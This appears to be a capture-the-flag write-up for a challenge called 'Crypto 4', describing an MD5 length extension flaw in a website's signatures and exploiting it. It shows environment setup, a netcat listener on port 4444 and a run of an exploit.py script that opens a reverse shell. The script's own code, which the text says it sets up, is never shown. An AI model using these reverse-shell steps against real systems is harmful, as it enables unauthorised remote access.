# Crypto 4

The website contains an MD5 Length Extension vulnerability. It's possible to append code to the provided example and calculate a new signature without needing the secret value.

Setup `exploit.py` as follows.
```
kali@kali:~$ python3 -m venv env
kali@kali:~$ . ./env/bin/activate
kali@kali:~$ pip install requests
Collecting requests
  Using cached requests-2.24.0-py2.py3-none-any.whl (61 kB)
Collecting urllib3!=1.25.0,!=1.25.1,<1.26,>=1.21.1
  Using cached urllib3-1.25.11-py2.py3-none-any.whl (127 kB)
Collecting certifi>=2017.4.17
  Using cached certifi-2020.6.20-py2.py3-none-any.whl (156 kB)
Collecting chardet<4,>=3.0.2
  Using cached chardet-3.0.4-py2.py3-none-any.whl (133 kB)
Collecting idna<3,>=2.5
  Using cached idna-2.10-py2.py3-none-any.whl (58 kB)
Installing collected packages: urllib3, certifi, chardet, idna, requests
Successfully installed certifi-2020.6.20 chardet-3.0.4 idna-2.10 requests-2.24.0 urllib3-1.25.11
```

Start a netcat handler.
```
kali@kali:~$ nc -lvp 4444
```

The `exploit.py` script can be used to obtain a reverse shell as as follows.
```
kali@kali:~$ python exploit.py 192.168.1.33 192.168.1.33 4444
Status code: 200
Response: {"result":{}}
```
